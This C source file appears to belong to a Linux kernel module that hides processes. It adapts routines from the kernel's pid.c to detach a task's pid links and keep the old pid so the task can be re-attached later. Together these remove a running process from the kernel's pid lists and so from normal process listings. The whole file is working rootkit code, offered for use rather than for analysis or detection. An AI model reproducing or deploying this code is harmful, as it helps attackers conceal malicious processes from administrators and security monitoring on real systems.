#include <linux/sched.h> // for task_struct
#include <linux/pid.h>
#include <linux/rculist.h>

#include "processHiderPidManipulation.h"
#include "messagesToUser.h"



// based on linux kernel (linux-source-3.2.0) pid.c

// prototypes for functions from pid.c
static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type);
//static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type, 	struct pid *pid);


void attach_pid(struct task_struct *task, enum pid_type type, struct pid *pid) {
	struct pid_link *link;

	link = &task->pids[type];
	link->pid = pid;
	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
}

static struct pid *__changePidAndGetOldPid(struct task_struct *task,
		enum pid_type type, struct pid *new) {
	struct pid_link *link;
	struct pid *oldPid;
	int tmp;

	link = &task->pids[type];
	oldPid = link->pid;

	hlist_del_rcu(&link->node);
	link->pid = new;

	//TODO: store each old pid to enable them to be stored as is....
	for (tmp = PIDTYPE_MAX; --tmp >= 0;) {
		if (!hlist_empty(&oldPid->tasks[tmp])) {
			printError("pid still in use / stopped early\n");
			return oldPid;
		}
	}

	// don't free so that it can be re-assigned again later
	return oldPid;
}

struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type) {
	return __changePidAndGetOldPid(task, type, NULL);
}

/*
struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
		struct pid *pid) {
	struct pid *oldPid = __changePidAndGetOldPid(task, type, pid);
	attach_pid(task, type, pid);
	return oldPid;
}
*/
